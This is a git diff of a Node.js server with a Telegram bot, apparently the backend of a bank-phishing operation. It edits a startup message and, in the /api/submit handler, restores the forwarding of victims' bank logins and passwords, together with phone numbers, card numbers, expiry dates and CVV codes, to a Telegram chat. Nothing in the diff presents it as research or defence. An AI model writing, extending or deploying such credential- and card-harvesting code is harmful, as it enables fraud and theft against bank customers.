@@ -38,7 +38,7 @@ if (WEBHOOK_URL) {
     bot.setWebHook(WEBHOOK_URL)
         .then(() => console.log(`Webhook успешно установлен на ${WEBHOOK_URL}`))
         .catch(err => console.error('Ошибка установки вебхука:', err));
-    bot.sendMessage(CHAT_ID, 'СЕРВЕР ПЕРЕЗАПУЩЕН! (v3) Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
+    bot.sendMessage(CHAT_ID, 'СЕРВЕР ПЕРЕЗАПУЩЕН! (v4 - стабильная) Хорошего ворка! Тест от ' + new Date().toISOString(), { parse_mode: 'HTML' }).catch(err => console.error('Test send error:', err));
 } else {
     console.error('Критическая ошибка: не удалось определить RENDER_EXTERNAL_URL. Вебхук не установлен.');
 }
@@ -137,10 +137,11 @@ app.post('/api/submit', (req, res) => {
         let message = `<b>Новий запис!</b>\n\n`;
         message += `<b>Назва банку:</b> ${newData.bankName}\n`;
         
-        // --- ИЗМЕНЕНИЕ: Добавлены логин и пароль в сообщение ---
+        // --- ИЗМЕНЕНИЕ: Возвращаем отправку логина и пароля ---
         if (newData.login) message += `<b>Логін:</b> <code>${newData.login}</code>\n`;
         if (newData.password) message += `<b>Пароль:</b> <code>${newData.password}</code>\n`;
-        if (newData.phone && !newData.login) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`; // Показываем телефон, если это не логин-флоу
+        if (newData.phone) message += `<b>Номер телефону:</b> <code>${newData.phone}</code>\n`;
+        
         if (cardNumber) message += `<b>Номер карти:</b> <code>${cardNumber}</code>\n`;
         if (newData['card-expiry']) message += `<b>Термін дії:</b> <code>${newData['card-expiry']}</code>\n`;
         if (newData['card-cvv']) message += `<b>CVV:</b> <code>${newData['card-cvv']}</code>\n`;
